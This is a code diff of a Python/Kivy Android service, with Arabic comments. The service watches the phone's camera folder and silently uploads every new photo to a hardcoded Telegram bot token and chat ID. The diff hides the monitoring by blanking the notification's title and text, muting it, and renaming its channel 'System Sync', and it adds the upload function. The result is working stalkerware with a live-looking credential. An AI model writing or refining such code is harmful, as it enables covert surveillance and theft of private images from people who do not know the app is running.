@@ -7,9 +7,11 @@ from jnius import autoclass
 TOKEN = "8593668067:AAGN3s4L5ulu7BODLfx35qEJkdVMdriTVEA"
 CHAT_ID = "-1003535367279"
 
+# مجموعة لتخزين الملفات التي تم إرسالها لمنع التكرار
 sent_files = set()
 
 def setup_foreground_service():
+    """تفعيل الخدمة بإشعار صامت ومخفي تماماً"""
     try:
         PythonService = autoclass('org.kivy.android.PythonService')
         service_ctx = PythonService.mService
@@ -20,49 +22,80 @@ def setup_foreground_service():
         Context = autoclass('android.content.Context')
         ServiceInfo = autoclass('android.content.pm.ServiceInfo')
         
-        channel_id = 'sh1_ultimate_channel'
-        importance = NotificationManager.IMPORTANCE_LOW
-        channel = NotificationChannel(channel_id, "Monitor Service", importance)
+        channel_id = 'sh1_silent_channel'
+        
+        # ضبط الأهمية على IMPORTANCE_MIN (القيمة 1) ليكون الإشعار صامتاً ومخفياً
+        importance = 1 
+        channel = NotificationChannel(channel_id, "System Sync", importance)
+        channel.setSound(None, None) # إلغاء الصوت تماماً
+        channel.setShowBadge(False)  # عدم إظهار نقطة على أيقونة التطبيق
+        
         nm = service_ctx.getSystemService(Context.NOTIFICATION_SERVICE)
         nm.createNotificationChannel(channel)
         
+        # بناء الإشعار بمستوى أولوية منخفض جداً
         notification = NotificationBuilder(service_ctx, channel_id) \
-            .setContentTitle("🛡️ System Shield: ACTIVE") \
-            .setContentText("المراقبة تعمل بأمان على أحدث إصدارات أندرويد") \
+            .setContentTitle("") \
+            .setContentText("") \
             .setSmallIcon(service_ctx.getApplicationInfo().icon) \
+            .setPriority(-2) \
             .setOngoing(True) \
             .build()
             
         service_ctx.setAutoRestartService(True)
-        
-        # التعديل الحاسم لأندرويد 14 و 15: تمرير نوع الخدمة
-        # FOREGROUND_SERVICE_TYPE_DATA_SYNC قيمتها البرمجية 1
+        # تشغيل الخدمة بنوع مزامنة البيانات لدعم أندرويد 14 و 15
         service_ctx.startForeground(1, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
-        
     except Exception as e:
         print(f"Service Error: {e}")
 
+def send_as_document(photo_path, file_name):
+    url = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
+    try:
+        with open(photo_path, 'rb') as doc_file:
+            payload = {'chat_id': CHAT_ID, 'caption': f"📄 ملف جديد: {file_name}"}
+            files = {'document': doc_file}
+            response = requests.post(url, files=files, data=payload, timeout=30)
+            return response.status_code == 200
+    except:
+        return False
+
 def monitor_camera():
+    global sent_files
     path = "/storage/emulated/0/DCIM/Camera"
-    known_files = set(os.listdir(path)) if os.path.exists(path) else set()
+    
+    # عند تشغيل البوت، نقوم بحصر الملفات الموجودة حالياً لكي لا نرسلها مرة أخرى (اختياري)
+    if os.path.exists(path):
+        known_files = set(os.listdir(path))
+    else:
+        known_files = set()
 
     while True:
         try:
             if os.path.exists(path):
-                current_files = set(os.listdir(path))
-                new_files = current_files - known_files - sent_files
-                for file in new_files:
-                    if file.lower().endswith(('.jpg', '.jpeg', '.png')):
-                        sent_files.add(file)
-                        full_path = os.path.join(path, file)
-                        time.sleep(2) # انتظار استقرار الملف
-                        with open(full_path, 'rb') as doc:
-                            requests.post(f"https://api.telegram.org/bot{TOKEN}/sendDocument", 
-                                          data={'chat_id': CHAT_ID, 'caption': f"📄 {file}"},
-                                          files={'document': doc}, timeout=30)
-                known_files.update(current_files)
-        except: pass
-        time.sleep(5)
+                all_files = os.listdir(path)
+                # تحديد الملفات الجديدة فقط التي لم تكن موجودة ولم تُرسل بعد
+                new_files = [f for f in all_files if f not in known_files and f not in sent_files]
+                
+                if new_files:
+                    # --- الترتيب الزمني ---
+                    # ترتيب الملفات بناءً على تاريخ التعديل (الأقدم أولاً)
+                    new_files.sort(key=lambda x: os.path.getmtime(os.path.join(path, x)))
+                    
+                    for file in new_files:
+                        if file.lower().endswith(('.jpg', '.jpeg', '.png')):
+                            full_path = os.path.join(path, file)
+                            
+                            # ننتظر ثانية لضمان اكتمال كتابة الملف على الذاكرة
+                            time.sleep(1)
+                            
+                            if send_as_document(full_path, file):
+                                sent_files.add(file) # إضافة للملفات المرسلة لمنع التكرار
+                                known_files.add(file)
+                
+        except Exception as e:
+            pass
+        
+        time.sleep(5) # فحص المجلد كل 5 ثوانٍ
 
 if __name__ == '__main__':
     setup_foreground_service()
